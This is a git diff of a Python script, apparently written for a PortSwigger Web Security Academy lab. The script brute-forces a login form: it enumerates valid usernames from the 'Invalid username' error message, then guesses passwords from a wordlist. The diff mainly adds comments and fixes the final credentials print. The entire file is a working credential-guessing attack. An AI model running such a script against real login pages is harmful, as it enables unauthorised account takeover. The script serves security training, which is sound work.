@@ -1,7 +1,8 @@
 import requests
 import json
-from bs4 import BeautifulSoup
 
+
+#DECLARATION OF STATIC VARIABLES
 url="https://0ac200af04c8c04281427593007e0044.web-security-academy.net/login"
 username_file="usuarios_noborrar.txt"
 password_file="passwords_db.txt"
@@ -20,14 +21,16 @@ def load_file(file):
 
 #function to brute force post requests
 def bruteforce_login(url,usernames,passwords):
-    #headers = { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36","Content-Type": "application/x-www-form-urlencoded"}
+    #final variables to return
     final_username=""
     final_password=""
+    #loop to find username
     for username in usernames:
             data={"username":username,"password":"asdw"}
             try:
+                #HTTP REQUEST
                 response=requests.post(url,data=data)
-                #print(f"Respuesta completa para {username}:\n{response.text}")
+                #is invalid username is in the respose, continues else breaks the loop
                 if "Invalid username" in response.text:
                     print(f"[-] Invalid username: {username}")
                 else:
@@ -36,11 +39,13 @@ def bruteforce_login(url,usernames,passwords):
                     break
             except requests.exceptions.RequestException as e:
                 print(f"[!] Error en la solicitud: {e}")
+    #loop to find password
     for password in passwords:
             data={"username":final_username,"password":password}
             try:
+                #HTTP REQUEST
                 response=requests.post(url,data=data)
-                #print(f"Respuesta completa para {username}:\n{response.text}")
+                #is incorrect password is in the respose, continues else breaks the loop
                 if "Incorrect password" in response.text:
                     print(f"[-] Invalid password: {password}")
                 else:
@@ -49,9 +54,12 @@ def bruteforce_login(url,usernames,passwords):
                     break
             except requests.exceptions.RequestException as e:
                 print(f"[!] Error en la solicitud: {e}")
-    print("username found ",username," password  found", password)
-    
+    #PRINT THE CREDENTIALS FOUND
+    print("username found ",final_username," password  found", final_password)
+
+#creation of list whith words list    
 usernames=load_file(username_file)
 passwords=load_file(password_file)
 
+#main function
 bruteforce_login(url,usernames,passwords)
